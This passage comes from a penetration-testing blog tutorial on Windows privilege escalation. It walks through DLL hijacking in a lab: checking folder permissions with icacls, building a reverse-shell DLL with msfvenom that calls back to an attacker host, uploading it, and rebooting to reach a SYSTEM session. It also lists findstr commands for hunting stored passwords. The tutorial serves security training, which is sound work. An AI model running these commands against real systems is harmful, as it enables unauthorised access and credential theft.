+40777/rwxrwxrwx   0           dir   2016-11-19 15:49:57 -0500  Boot
+40777/rwxrwxrwx   0           dir   2013-08-22 10:45:52 -0400  Documents and Settings
+40555/r-xr-xr-x   0           dir   2016-07-27 07:12:06 -0400  MSOCache
+40777/rwxrwxrwx   0           dir   2013-08-22 11:22:35 -0400  PerfLogs
+40555/r-xr-xr-x   0           dir   2017-01-18 04:05:59 -0500  Program Files
+40555/r-xr-xr-x   0           dir   2017-01-18 04:07:04 -0500  Program Files (x86)
+40777/rwxrwxrwx   0           dir   2017-01-18 04:05:28 -0500  ProgramData
+40777/rwxrwxrwx   0           dir   2017-01-18 09:51:36 -0500  Python27
+40777/rwxrwxrwx   0           dir   2013-09-11 13:15:09 -0400  Recovery
+40777/rwxrwxrwx   0           dir   2017-01-18 03:52:51 -0500  System Volume Information
+40555/r-xr-xr-x   0           dir   2017-01-04 21:51:12 -0500  Users
+40777/rwxrwxrwx   0           dir   2017-01-18 03:53:05 -0500  Windows
+100444/r--r--r--  404250      fil   2014-06-14 06:46:09 -0400  bootmgr
+100666/rw-rw-rw-  1409286144  fil   2017-01-18 13:53:34 -0500  pagefile.sys
+100666/rw-rw-rw-  16777216    fil   2017-01-18 13:53:34 -0500  swapfile.sys
+</pre>
+<p>Just as I thought, Python was installed. Let&#8217;s check permissions:</p>
+<pre class="EnlighterJSRAW" data-enlighter-highlight="1,7,12,13">meterpreter &gt; shell
+Process 3900 created.
+Channel 3 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\&gt;icacls C:\Python27
+icacls C:\Python27
+C:\Python27 BUILTIN\Administrators:(I)(OI)(CI)(F)
+            NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+            BUILTIN\Users:(I)(OI)(CI)(RX)
+            NT AUTHORITY\Authenticated Users:(I)(M)
+            NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)
+
+Successfully processed 1 files; Failed processing 0 files
+
+C:\&gt;
+</pre>
+<p>BINGO! Authenticated users have modification permissions!</p>
+<p>One last check left. We should ensure if <em>C:\Python27</em> directory added in the PATH environment variable. The easiest way to do this, typing &#8220;python -h&#8221; in the shell. If the help page is displayed successfully it means the directory is added to the PATH:</p>
+<pre class="EnlighterJSRAW" data-enlighter-highlight="1,7">meterpreter &gt; shell
+Process 3360 created.
+Channel 2 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\&gt;python -h
+python -h
+usage: python [option] ... [-c cmd | -m mod | file | -] [arg] ...
+Options and arguments (and corresponding environment variables):
+-B     : don't write .py[co] files on import; also PYTHONDONTWRITEBYTECODE=x
+-c cmd : program passed in as string (terminates option list)
+-d     : debug output from parser; also PYTHONDEBUG=x
+-E     : ignore PYTHON* environment variables (such as PYTHONPATH)
+-h     : print this help message and exit (also --help)
+.
+.
+.</pre>
+<p>Nice! Let&#8217;s create a simple reverse shell payload as a DLL:</p>
+<pre class="EnlighterJSRAW" data-enlighter-highlight="1"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="0d7f6262794d666c6164">[email&#160;protected]</a>:~# msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.2.60 lport=8989 -f dll &gt; hijackable.dll
+No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No Arch selected, selecting Arch: x86_64 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 510 bytes
+Final size of dll file: 5120 bytes
+
+<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="35475a5a41755e54595c">[email&#160;protected]</a>:~# 
+</pre>
+<p>Then place it in the <em>C:\Python27</em> directory:</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="null">meterpreter &gt; upload -f hijackable.dll
+[*] uploading  : hijackable.dll -&gt; hijackable.dll
+[*] uploaded   : hijackable.dll -&gt; hijackable.dll
+meterpreter &gt;</pre>
+<p>Now, we should restart the <em>Vulnerable.exe </em>process, so that the process can load malicious DLL. We can try to kill the process. If we are lucky it will be started automatically:</p>
+<pre class="EnlighterJSRAW" data-enlighter-highlight="1">meterpreter &gt; kill 952
+Killing: 952
+[-] stdapi_sys_process_kill: Operation failed: Access is denied.</pre>
+<p>We are unlucky today, not even killed. Anyway, we can try restarting the machine. If the &#8220;Vulnerable.exe&#8221; is a startup application, a service, or a scheduled task it will be launched again. At worst, we will wait for someone to run it.</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="null">meterpreter &gt; shell
+Process 3024 created.
+Channel 3 created.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Users\testuser\Downloads&gt;shutdown /r /t 0
+shutdown /r /t 0
+
+[*] 192.168.2.40 - Meterpreter session 3 closed.  Reason: Died</pre>
+<p>The machine is restarting. Let&#8217;s start a new handler and hope it starts again:</p>
+<pre class="EnlighterJSRAW" data-enlighter-highlight="1,8,9">msf exploit(handler) &gt; run
+
+[*] Started reverse TCP handler on 192.168.2.60:8989 
+[*] Starting the payload handler...
+[*] Sending stage (957999 bytes) to 192.168.2.40
+[*] Meterpreter session 5 opened (192.168.2.60:8989 -&gt; 192.168.2.40:49156) at 2017-01-18 07:47:39 -0500
+
+meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+</pre>
+<p>We got it! 😉</p>
+<h3>Stored Credentials</h3>
+<p>If none of that methods work, you may need to try finding some stored credentials to escalate your privileges. You may want to check these directories:</p>
+<ul>
+<li>C:\unattend.xml</li>
+<li>C:\sysprep.inf</li>
+<li>C:\sysprep\sysprep.xml</li>
+</ul>
+<p>And you may want to search files using queries like this:</p>
+<ul>
+<li>dir c:\*vnc.ini /s /b /c</li>
+<li>dir c:\*ultravnc.ini /s /b /c</li>
+<li>dir c:\ /s /b /c | findstr /si *vnc.ini</li>
+<li>findstr /si password *.txt | *.xml | *.ini</li>
+<li>findstr /si pass *.txt | *.xml | *.ini</li>
+</ul>
+<h3>Kernel Exploits</h3>
+<p>In this blog post, I intentionally tried to explain escalation methods that do not rely upon kernel exploits. But if you are about to use an exploit to escalate your privileges, maybe this command will help you to choose which one you should use:</p>
+<p><code class="EnlighterJSRAW" data-enlighter-language="null">wmic qfe get Caption,Description,HotFixID,InstalledOn</code></p>
+<p>It will list the updates that are installed on the machine.</p>
+<h3>A Note About Payloads</h3>
+<p>In this blog post, my payloads generated by MSFvenom. However today, these payloads are <a href="https://www.virustotal.com/tr/file/c904c6a47434e67fe10064964619d2d0568b1976e6e3ccacccf87d8e7d7d1732/analysis/1484771308/">flagged by almost all Anti-Viruses</a>. Because it is a popular tool and well known by AV vendors. Creating your own executables using AV bypassing techniques will give you the best results. You may consider reading these articles:</p>
+<ul>
+<li><a href="https://pentest.blog/art-of-anti-detection-1-introduction-to-av-detection-techniques/">Art of Anti Detection 1 – Introduction to AV &amp; Detection Techniques</a></li>
+<li><a href="https://pentest.blog/art-of-anti-detection-2-pe-backdoor-manufacturing/">Art of Anti Detection 2 – PE Backdoor Manufacturing</a></li>
+</ul>
+<h3>References</h3>
+<p>[1] &#8211; https://www.trustwave.com/Resources/SpiderLabs-Blog/My-5-Top-Ways-to-Escalate-Privileges/<br />
+[2] &#8211; https://msdn.microsoft.com/en-us/library/windows/desktop/ms682425(v=vs.85).aspx<br />
+[3] &#8211; https://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx<br />
+[4] &#8211; https://www.synack.com/2014/12/10/dll-hijacking-in-2014/<br />
+[5] &#8211; http://www.fuzzysecurity.com/tutorials/16.html<br />
+[6] &#8211; https://www.exploit-db.com/docs/39732.pdf<br />
+[7] &#8211; https://www.tecklyfe.com/remediation-microsoft-windows-unquoted-service-path-enumeration-vulnerability/<br />
+[8] &#8211; https://toshellandback.com/2015/11/24/ms-priv-esc/<br />
+[9] &#8211; https://it-ovid.blogspot.de/2012/02/windows-privilege-escalation.html<br />
+[10] &#8211; https://blog.netspi.com/windows-privilege-escalation-part-1-local-administrator-privileges/<br />
+[11] &#8211; https://msitpros.com/?p=2012</p>
+<p>&nbsp;</p>
+</div>
+<footer class="entry-meta">
+
+<div class="tagcloud">
+<a href="https://pentest.blog/tag/privilege-escalation/">privilege escalation</a> <a href="https://pentest.blog/tag/windows/">windows</a>
+</div>
+
+</footer>
+</div>
+<div class="post-inner-content secondary-content-box">
+
+<div class="author-bio content-box-inner">
+
+<div class="avatar">
+<img alt='' src='https://secure.gravatar.com/avatar/b800f689719c5460121e5329e4f6d135?s=60&#038;d=monsterid&#038;r=g' srcset='https://secure.gravatar.com/avatar/b800f689719c5460121e5329e4f6d135?s=120&#038;d=monsterid&#038;r=g 2x' class='avatar avatar-60 photo' height='60' width='60' /> </div>
+
+
+<div class="author-bio-content">
+<h4 class="author-name"><a href="https://pentest.blog/author/gokhan-sagoglu/">Gokhan Sagoglu</a></h4>
+<p class="author-description">
+Pentest ninja @ Prodaft / INVICTUS Europe. </p>
+</div>
+</div>
+</div>
+</article>
+<div id="disqus_thread"></div>
+<nav class="navigation post-navigation" role="navigation">
+<h2 class="screen-reader-text">Post navigation</h2>
+<div class="nav-links"><div class="nav-previous"><a href="https://pentest.blog/art-of-anti-detection-2-pe-backdoor-manufacturing/" rel="prev"><i class="fa fa-chevron-left"></i> <span class="post-title">Art of Anti Detection 2 &#8211; PE Backdoor Manufacturing</span></a></div><div class="nav-next"><a href="https://pentest.blog/unexpected-journey-into-the-alienvault-ossimusm-during-engagement/" rel="next"><span class="post-title">Unexpected Journey into the AlienVault OSSIM/USM During Engagement <i class="fa fa-chevron-right"></i></span></a></div></div>
+</nav>
+</main>
+</div>
+</div>
+<div id="secondary" class="widget-area col-sm-12 col-md-4" role="complementary">
+<div class="well">
+<aside id="sparkling-social-2" class="widget sparkling-social"><h3 class="widget-title">Follow us</h3>
+
+<div class="social-icons sticky-sidebar-social">
+<nav id="menu-social" class="social-icons"><ul id="menu-social-items" class="social-menu"><li id="menu-item-15" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15"><a href="https://twitter.com/pentestblog"><i class="social_icon fa"><span>Follow Us on Twitter</span></i></a></li>
+<li id="menu-item-16" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-16"><a href="/cdn-cgi/l/email-protection#d5b8b0bdb8b0a195b8b0bdb8b0a1bcbbb6b0fbbbb0a1"><i class="social_icon fa"><span>Mail</span></i></a></li>
+<li id="menu-item-17" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-17"><a href="https://pentest.blog/feed/"><i class="social_icon fa"><span>RSS Feed</span></i></a></li>
+<li id="menu-item-473" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-473"><a href="https://plus.google.com/b/104119310868709707328/"><i class="social_icon fa"><span>Google</span></i></a></li>
+</ul></nav>
+</div></aside><aside id="search-2" class="widget widget_search">
+<form role="search" method="get" class="form-search" action="https://pentest.blog/">
+<div class="input-group">
+<label class="screen-reader-text" for="s">Search for:</label>
+<input type="text" class="form-control search-query" placeholder="Search&hellip;" value="" name="s" title="Search for:" />
+<span class="input-group-btn">
+<button type="submit" class="btn btn-default" name="submit" id="searchsubmit" value="Search"><span class="glyphicon glyphicon-search"></span></button>
+</span>
+</div>
+</form>
+</aside><aside id="sparkling_popular_posts-2" class="widget sparkling-popular-posts"><h3 class="widget-title">Popular Posts</h3>
+
+<div class="popular-posts-wrapper">
+
+<div class="post">
+
+<div class="post-image ">
+<a href="https://pentest.blog/art-of-anti-detection-2-pe-backdoor-manufacturing/">
+<img width="60" height="60" src="https://pentest.blog/wp-content/uploads/camera-door-60x60.jpg" class="attachment-tab-small size-tab-small wp-post-image" alt="" srcset="https://pentest.blog/wp-content/uploads/camera-door-60x60.jpg 60w, https://pentest.blog/wp-content/uploads/camera-door-150x150.jpg 150w" sizes="(max-width: 60px) 100vw, 60px" /> </a>
+</div> 
+
+<div class="post-content">
+<a href="https://pentest.blog/art-of-anti-detection-2-pe-backdoor-manufacturing/">Art of Anti Detection 2 &#8211; PE Backdoor Manufacturing</a>
+<span class="date">10 Jan , 2017</span>
+</div>
+</div>
+
+<div class="post">
+
+<div class="post-image ">
+<a href="https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/">
+<img width="60" height="60" src="https://pentest.blog/wp-content/uploads/taking-down-windows-nazi-60x60.jpg" class="attachment-tab-small size-tab-small wp-post-image" alt="" srcset="https://pentest.blog/wp-content/uploads/taking-down-windows-nazi-60x60.jpg 60w, https://pentest.blog/wp-content/uploads/taking-down-windows-nazi-150x150.jpg 150w" sizes="(max-width: 60px) 100vw, 60px" /> </a>
+</div> 
+
+<div class="post-content">
+<a href="https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/">Windows Privilege Escalation Methods for Pentesters</a>
+<span class="date">18 Jan , 2017</span>
+</div>
+</div>
+
+<div class="post">
+
+<div class="post-image ">
+<a href="https://pentest.blog/explore-hidden-networks-with-double-pivoting/">
+<img width="60" height="60" src="https://pentest.blog/wp-content/uploads/double-pivot-60x60.jpg" class="attachment-tab-small size-tab-small wp-post-image" alt="" srcset="https://pentest.blog/wp-content/uploads/double-pivot-60x60.jpg 60w, https://pentest.blog/wp-content/uploads/double-pivot-150x150.jpg 150w" sizes="(max-width: 60px) 100vw, 60px" /> </a>
+</div> 
+
+<div class="post-content">
+<a href="https://pentest.blog/explore-hidden-networks-with-double-pivoting/">Explore Hidden Networks With Double Pivoting</a>
+<span class="date">31 Dec , 2016</span>
+</div>
+</div>
+
+
+<div class="post">
+
+<div class="post-image ">
+<a href="https://pentest.blog/unexpected-journey-4-escaping-from-restricted-shell-and-gaining-root-access-to-solarwinds-log-event-manager-siem-product/">
+<img width="60" height="60" src="https://pentest.blog/wp-content/uploads/northern-lights-225525_1280-60x60.jpg" class="attachment-tab-small size-tab-small wp-post-image" alt="" srcset="https://pentest.blog/wp-content/uploads/northern-lights-225525_1280-60x60.jpg 60w, https://pentest.blog/wp-content/uploads/northern-lights-225525_1280-150x150.jpg 150w" sizes="(max-width: 60px) 100vw, 60px" /> </a>
+</div> 
+
+<div class="post-content">
+<a href="https://pentest.blog/unexpected-journey-4-escaping-from-restricted-shell-and-gaining-root-access-to-solarwinds-log-event-manager-siem-product/">Unexpected Journey #4 &#8211; Escaping from Restricted Shell and Gaining Root Access to SolarWinds Log &#038; Event Manager (SIEM) Product</a>
+<span class="date">17 Mar , 2017</span>
+</div>
+</div>
+
+<div class="post">
+
+<div class="post-image ">
+<a href="https://pentest.blog/how-to-perform-ddos-test-as-a-pentester/">
+<img width="60" height="60" src="https://pentest.blog/wp-content/uploads/ddos-60x60.jpg" class="attachment-tab-small size-tab-small wp-post-image" alt="" srcset="https://pentest.blog/wp-content/uploads/ddos-60x60.jpg 60w, https://pentest.blog/wp-content/uploads/ddos-150x150.jpg 150w" sizes="(max-width: 60px) 100vw, 60px" /> </a>
+</div> 
+
+<div class="post-content">
+<a href="https://pentest.blog/how-to-perform-ddos-test-as-a-pentester/">How to Perform DDoS Test as a Pentester</a>
+<span class="date">03 Dec , 2016</span>
+</div>
+</div>
+</div> 
+</aside><aside id="text-3" class="widget widget_text"><h3 class="widget-title">Proactive Defense Against Future Threats</h3> <div class="textwidget"><a href="https://www.prodaft.com/?source=pentest.blog"><img src="https://pentest.blog/wp-content/uploads/prodaft-logo.jpg"></a></div>
+</aside> <aside id="recent-posts-2" class="widget widget_recent_entries"> <h3 class="widget-title">Recent Posts</h3> <ul>
+<li>
+<a href="https://pentest.blog/advisory-manageengine-applications-manager-remote-code-execution-sqli-and/">Advisory | ManageEngine Applications Manager Remote Code Execution and SQLi</a>
+</li>
+<li>
+<a href="https://pentest.blog/advisory-xplico-unauthenticated-remote-code-execution-cve-2017-16666/">Advisory | Xplico Unauthenticated Remote Code Execution CVE-2017-16666</a>
+</li>
+<li>
+<a href="https://pentest.blog/introducing-new-packing-method-first-reflective-pe-packer/">Introducing New Packing Method: First Reflective PE Packer Amber</a>
+</li>
+<li>
+<a href="https://pentest.blog/one-ring-to-rule-them-all-same-rce-on-multiple-trend-micro-products/">One ring to rule them all &#8211; Same RCE on multiple Trend Micro products</a>
+</li>
+<li>
+<a href="https://pentest.blog/advisory-denyall-web-application-firewall-unauthenticated-remote-code-execution/">Advisory | DenyAll Web Application Firewall Unauthenticated Remote Code Execution (CVE-2017-14706)</a>
+</li>
+</ul>
+</aside><aside id="recent-comments-2" class="widget widget_recent_comments"><h3 class="widget-title">Latest Comments</h3><ul id="recentcomments"><li class="recentcomments"><span class="comment-author-link">Chase Run Taylor</span> on <a href="https://pentest.blog/art-of-anti-detection-1-introduction-to-av-detection-techniques/#comment-1243">Art of Anti Detection 1 &#8211; Introduction to AV &amp; Detection Techniques</a></li><li class="recentcomments"><span class="comment-author-link"><a href='http://www.mehmetince.net/' rel='external nofollow' class='url'>Mehmet İnce</a></span> on <a href="https://pentest.blog/unexpected-journey-4-escaping-from-restricted-shell-and-gaining-root-access-to-solarwinds-log-event-manager-siem-product/#comment-1242">Unexpected Journey #4 &#8211; Escaping from Restricted Shell and Gaining Root Access to SolarWinds Log &#038; Event Manager (SIEM) Product</a></li><li class="recentcomments"><span class="comment-author-link">0x00</span> on <a href="https://pentest.blog/unexpected-journey-4-escaping-from-restricted-shell-and-gaining-root-access-to-solarwinds-log-event-manager-siem-product/#comment-1241">Unexpected Journey #4 &#8211; Escaping from Restricted Shell and Gaining Root Access to SolarWinds Log &#038; Event Manager (SIEM) Product</a></li><li class="recentcomments"><span class="comment-author-link"><a href='http://www.mehmetince.net/' rel='external nofollow' class='url'>Mehmet İnce</a></span> on <a href="https://pentest.blog/unexpected-journey-4-escaping-from-restricted-shell-and-gaining-root-access-to-solarwinds-log-event-manager-siem-product/#comment-1240">Unexpected Journey #4 &#8211; Escaping from Restricted Shell and Gaining Root Access to SolarWinds Log &#038; Event Manager (SIEM) Product</a></li><li class="recentcomments"><span class="comment-author-link">0x00</span> on <a href="https://pentest.blog/unexpected-journey-4-escaping-from-restricted-shell-and-gaining-root-access-to-solarwinds-log-event-manager-siem-product/#comment-1239">Unexpected Journey #4 &#8211; Escaping from Restricted Shell and Gaining Root Access to SolarWinds Log &#038; Event Manager (SIEM) Product</a></li></ul></aside><aside id="tag_cloud-2" class="widget widget_tag_cloud"><h3 class="widget-title">Tags</h3><div class="tagcloud"><a href="https://pentest.blog/tag/0day/" class="tag-cloud-link tag-link-70 tag-link-position-1" style="font-size: 22pt;" aria-label="0day (7 items)">0day</a>
+<a href="https://pentest.blog/tag/1day/" class="tag-cloud-link tag-link-67 tag-link-position-2" style="font-size: 12.2pt;" aria-label="1day (2 items)">1day</a>
+<a href="https://pentest.blog/tag/advisory/" class="tag-cloud-link tag-link-66 tag-link-position-3" style="font-size: 17.333333333333pt;" aria-label="advisory (4 items)">advisory</a>
+<a href="https://pentest.blog/tag/alienvault/" class="tag-cloud-link tag-link-69 tag-link-position-4" style="font-size: 8pt;" aria-label="alienvault (1 item)">alienvault</a>
+<a href="https://pentest.blog/tag/antidetection/" class="tag-cloud-link tag-link-65 tag-link-position-5" style="font-size: 8pt;" aria-label="antidetection (1 item)">antidetection</a>
+<a href="https://pentest.blog/tag/backdoors/" class="tag-cloud-link tag-link-37 tag-link-position-6" style="font-size: 8pt;" aria-label="backdoors (1 item)">backdoors</a>
+<a href="https://pentest.blog/tag/binary/" class="tag-cloud-link tag-link-40 tag-link-position-7" style="font-size: 8pt;" aria-label="binary (1 item)">binary</a>
+<a href="https://pentest.blog/tag/burp/" class="tag-cloud-link tag-link-52 tag-link-position-8" style="font-size: 12.2pt;" aria-label="burp (2 items)">burp</a>
+<a href="https://pentest.blog/tag/bypass/" class="tag-cloud-link tag-link-78 tag-link-position-9" style="font-size: 12.2pt;" aria-label="bypass (2 items)">bypass</a>
+<a href="https://pentest.blog/tag/crypter/" class="tag-cloud-link tag-link-27 tag-link-position-10" style="font-size: 12.2pt;" aria-label="crypter (2 items)">crypter</a>
+<a href="https://pentest.blog/tag/ddos/" class="tag-cloud-link tag-link-42 tag-link-position-11" style="font-size: 8pt;" aria-label="ddos (1 item)">ddos</a>
+<a href="https://pentest.blog/tag/dns/" class="tag-cloud-link tag-link-15 tag-link-position-12" style="font-size: 17.333333333333pt;" aria-label="dns (4 items)">dns</a>
+<a href="https://pentest.blog/tag/dos/" class="tag-cloud-link tag-link-43 tag-link-position-13" style="font-size: 8pt;" aria-label="dos (1 item)">dos</a>
+<a href="https://pentest.blog/tag/exploit/" class="tag-cloud-link tag-link-77 tag-link-position-14" style="font-size: 12.2pt;" aria-label="exploit (2 items)">exploit</a>
+<a href="https://pentest.blog/tag/flood/" class="tag-cloud-link tag-link-54 tag-link-position-15" style="font-size: 8pt;" aria-label="flood (1 item)">flood</a>
+<a href="https://pentest.blog/tag/fud/" class="tag-cloud-link tag-link-26 tag-link-position-16" style="font-size: 8pt;" aria-label="fud (1 item)">fud</a>
+<a href="https://pentest.blog/tag/icmp/" class="tag-cloud-link tag-link-17 tag-link-position-17" style="font-size: 12.2pt;" aria-label="icmp (2 items)">icmp</a>
+<a href="https://pentest.blog/tag/llmnr/" class="tag-cloud-link tag-link-56 tag-link-position-18" style="font-size: 8pt;" aria-label="llmnr (1 item)">llmnr</a>
+<a href="https://pentest.blog/tag/malware/" class="tag-cloud-link tag-link-25 tag-link-position-19" style="font-size: 8pt;" aria-label="malware (1 item)">malware</a>
+<a href="https://pentest.blog/tag/metasploit/" class="tag-cloud-link tag-link-61 tag-link-position-20" style="font-size: 19.2pt;" aria-label="metasploit (5 items)">metasploit</a>
+<a href="https://pentest.blog/tag/mitm/" class="tag-cloud-link tag-link-49 tag-link-position-21" style="font-size: 8pt;" aria-label="mitm (1 item)">mitm</a>
+<a href="https://pentest.blog/tag/netbios/" class="tag-cloud-link tag-link-48 tag-link-position-22" style="font-size: 8pt;" aria-label="netbios (1 item)">netbios</a>
+<a href="https://pentest.blog/tag/network/" class="tag-cloud-link tag-link-31 tag-link-position-23" style="font-size: 8pt;" aria-label="network (1 item)">network</a>
+<a href="https://pentest.blog/tag/office-exploit/" class="tag-cloud-link tag-link-24 tag-link-position-24" style="font-size: 8pt;" aria-label="office exploit (1 item)">office exploit</a>
+<a href="https://pentest.blog/tag/patching/" class="tag-cloud-link tag-link-63 tag-link-position-25" style="font-size: 8pt;" aria-label="patching (1 item)">patching</a>
+<a href="https://pentest.blog/tag/phishing/" class="tag-cloud-link tag-link-21 tag-link-position-26" style="font-size: 8pt;" aria-label="phishing (1 item)">phishing</a>
+<a href="https://pentest.blog/tag/pivoting/" class="tag-cloud-link tag-link-57 tag-link-position-27" style="font-size: 8pt;" aria-label="pivoting (1 item)">pivoting</a>
+<a href="https://pentest.blog/tag/privilege-escalation/" class="tag-cloud-link tag-link-60 tag-link-position-28" style="font-size: 8pt;" aria-label="privilege escalation (1 item)">privilege escalation</a>
+<a href="https://pentest.blog/tag/responder/" class="tag-cloud-link tag-link-50 tag-link-position-29" style="font-size: 8pt;" aria-label="responder (1 item)">responder</a>
+<a href="https://pentest.blog/tag/reversing/" class="tag-cloud-link tag-link-41 tag-link-position-30" style="font-size: 8pt;" aria-label="reversing (1 item)">reversing</a>
+<a href="https://pentest.blog/tag/routing/" class="tag-cloud-link tag-link-58 tag-link-position-31" style="font-size: 8pt;" aria-label="routing (1 item)">routing</a>
+<a href="https://pentest.blog/tag/siem/" class="tag-cloud-link tag-link-72 tag-link-position-32" style="font-size: 8pt;" aria-label="siem (1 item)">siem</a>
+<a href="https://pentest.blog/tag/sql-injection/" class="tag-cloud-link tag-link-13 tag-link-position-33" style="font-size: 15pt;" aria-label="sql injection (3 items)">sql injection</a>
+<a href="https://pentest.blog/tag/sqlmap/" class="tag-cloud-link tag-link-62 tag-link-position-34" style="font-size: 12.2pt;" aria-label="sqlmap (2 items)">sqlmap</a>
+<a href="https://pentest.blog/tag/ssh/" class="tag-cloud-link tag-link-16 tag-link-position-35" style="font-size: 8pt;" aria-label="ssh (1 item)">ssh</a>
+<a href="https://pentest.blog/tag/tcp/" class="tag-cloud-link tag-link-45 tag-link-position-36" style="font-size: 8pt;" aria-label="tcp (1 item)">tcp</a>
+<a href="https://pentest.blog/tag/tunneling/" class="tag-cloud-link tag-link-14 tag-link-position-37" style="font-size: 8pt;" aria-label="tunneling (1 item)">tunneling</a>
+<a href="https://pentest.blog/tag/udp/" class="tag-cloud-link tag-link-44 tag-link-position-38" style="font-size: 8pt;" aria-label="udp (1 item)">udp</a>
+<a href="https://pentest.blog/tag/wep/" class="tag-cloud-link tag-link-33 tag-link-position-39" style="font-size: 8pt;" aria-label="wep (1 item)">wep</a>
+<a href="https://pentest.blog/tag/windows/" class="tag-cloud-link tag-link-51 tag-link-position-40" style="font-size: 15pt;" aria-label="windows (3 items)">windows</a>
+<a href="https://pentest.blog/tag/wireless/" class="tag-cloud-link tag-link-30 tag-link-position-41" style="font-size: 8pt;" aria-label="wireless (1 item)">wireless</a>
+<a href="https://pentest.blog/tag/word/" class="tag-cloud-link tag-link-23 tag-link-position-42" style="font-size: 8pt;" aria-label="word (1 item)">word</a>
+<a href="https://pentest.blog/tag/wpa/" class="tag-cloud-link tag-link-32 tag-link-position-43" style="font-size: 8pt;" aria-label="wpa (1 item)">wpa</a>
+<a href="https://pentest.blog/tag/wpa2/" class="tag-cloud-link tag-link-35 tag-link-position-44" style="font-size: 8pt;" aria-label="wpa2 (1 item)">wpa2</a>
+<a href="https://pentest.blog/tag/wpad/" class="tag-cloud-link tag-link-46 tag-link-position-45" style="font-size: 8pt;" aria-label="wpad (1 item)">wpad</a></div>
+</aside><aside id="custom_html-3" class="widget_text widget widget_custom_html"><h3 class="widget-title">Awarded Top 15 Pentest Blog</h3><div class="textwidget custom-html-widget"><a href="https://blog.feedspot.com/pentest_blogs/" title="Pentest Blogs" target="_blank"><img alt="Pentest Blogs" src="/wp-content/uploads/pentest_1000px.png" /></a></div></aside> </div>
+</div>
+</div>
+</div>
+</div>
+<div id="footer-area">
+<div class="container footer-inner">
+<div class="row">
+</div>
+</div>
+<footer id="colophon" class="site-footer" role="contentinfo">
+<div class="site-info container">
+<div class="row">
+<nav role="navigation" class="col-md-6">
+</nav>
+<div class="copyright col-md-6">
+by PRODAFT LLC ninja team ⚔️ Theme by <a href="http://colorlib.com/" target="_blank">Colorlib</a> Powered by <a href="http://wordpress.org/" target="_blank">WordPress</a> </div>
+</div>
+</div>
+<div class="scroll-to-top"><i class="fa fa-angle-up"></i></div>
+</footer>
+</div>
+</div>
+<script data-cfasync="false" src="/cdn-cgi/scripts/f2bf09f8/cloudflare-static/email-decode.min.js"></script><script type="text/javascript">
+			jQuery( document ).ready( function( $ ){
+			  if ( $( window ).width() >= 767 ){
+				$( '.navbar-nav > li.menu-item > a' ).click( function(){
+					if( $( this ).attr('target') !== '_blank' ){
+						window.location = $( this ).attr( 'href' );
+					}
+				});
+			  }
+			});
+		  </script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var countVars = {"disqusShortname":"pentestblog"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://pentest.blog/wp-content/plugins/disqus-comment-system/public/js/comment_count.js?ver=3.0.15'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var embedVars = {"disqusConfig":{"integration":"wordpress 3.0.15"},"disqusIdentifier":"454 https:\/\/pentest.blog\/?p=454","disqusShortname":"pentestblog","disqusTitle":"Windows Privilege Escalation Methods for Pentesters","disqusUrl":"https:\/\/pentest.blog\/windows-privilege-escalation-methods-for-pentesters\/","postId":"454"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://pentest.blog/wp-content/plugins/disqus-comment-system/public/js/comment_embed.js?ver=3.0.15'></script>
+<script type='text/javascript' src='https://pentest.blog/wp-content/themes/sparkling/assets/js/skip-link-focus-fix.min.js?ver=20140222'></script>
+<script type='text/javascript' src='https://pentest.blog/wp-includes/js/comment-reply.min.js?ver=4.9.6'></script>
+<script type='text/javascript' src='https://pentest.blog/wp-content/plugins/enlighter/resources/mootools-core-yc.js?ver=3.5'></script>
+<script type='text/javascript' src='https://pentest.blog/wp-content/plugins/enlighter/resources/EnlighterJS.min.js?ver=3.5'></script>
+<script type='text/javascript' src='https://pentest.blog/wp-content/plugins/enlighter/cache/EnlighterJS.init.js?ver=8ba8c8899f'></script>
+<script type='text/javascript' src='https://pentest.blog/wp-includes/js/wp-embed.min.js?ver=4.9.6'></script>
+<script type='text/javascript' src='https://pentest.blog/wp-content/uploads/asciinema-player.js'></script>
+<link rel='stylesheet' href='https://pentest.blog/wp-content/uploads/asciinema-player.css' type='text/css' media='all' />
+</body>
+</html>
